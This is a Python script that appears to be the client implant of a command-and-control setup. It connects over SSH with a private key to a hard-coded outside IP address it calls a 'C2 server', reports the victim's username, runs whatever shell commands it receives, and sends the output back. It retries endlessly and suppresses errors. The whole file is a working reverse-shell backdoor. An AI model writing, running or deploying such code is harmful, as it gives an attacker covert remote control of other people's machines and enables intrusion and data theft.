#!/bin/env python3

# This is a basic client for executing a command

import os
import time
import threading
import paramiko
import subprocess

# This method receives an encoded command
def exec_underlying_command(command):
    if isinstance(command, bytes):
        command = command.decode()
    print(f"[*] Received command:\n\t'{command}'")

    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()  # Get the output and errors if any

    result = None
    if process.returncode == 0:  # Check if the command was successful
        result = stdout.decode()
    else:
        result = stderr.decode()

    return result.strip('\n')


def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
    client = paramiko.SSHClient()

    # Load host keys if available, or use AutoAddPolicy to add new ones
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Load the private key from a file
    private_key = paramiko.RSAKey.from_private_key_file(key_file)
    
    # Connect to the SSH server using the private key
    client.connect(ip, username=user, pkey=private_key, port=port)

    # Open a session and execute the command
    ssh_session = client.get_transport().open_session()
        
    server_instructions = None

    #while server_instructions != "kill":
    if ssh_session.active:
        print("[!] Sending identity!")
        ssh_session.send(bot_user.encode())

        print("[!] Listening for instructions ...")
        server_instructions = ssh_session.recv(1024).decode().strip()

        if server_instructions:
            print(f"[!] Received command: {server_instructions}")

            # Handle termination command
            if server_instructions == 'kill':
                print("[!] Session terminated by the server!")
                ssh_session.close()
                client.close()
                return

            # Execute command on the channel and capture output
            print("Trying to execute the command")
            response = exec_underlying_command(server_instructions)

            ssh_session.send(response.encode())

            print("[!] Response sent!")

            #server_instructions = "kill"
            ssh_session.close()
            client.close()
            return
            
    time.sleep(1)

    client.close()

if __name__ == "__main__":

    command = "whoami".encode()
    user = exec_underlying_command(command)
    #print(user)

    # Try forever the commands
    while True:
        try:
            ssh_rev_shell('34.204.78.186', 'ubuntu', './archenemy_rsa', user, 64000)
        except Exception as e:
            pass
            #print(f"[!] Reconnection to C2 server failed!\n{e}\n")

        # How frequent request a command
        time.sleep(0.5)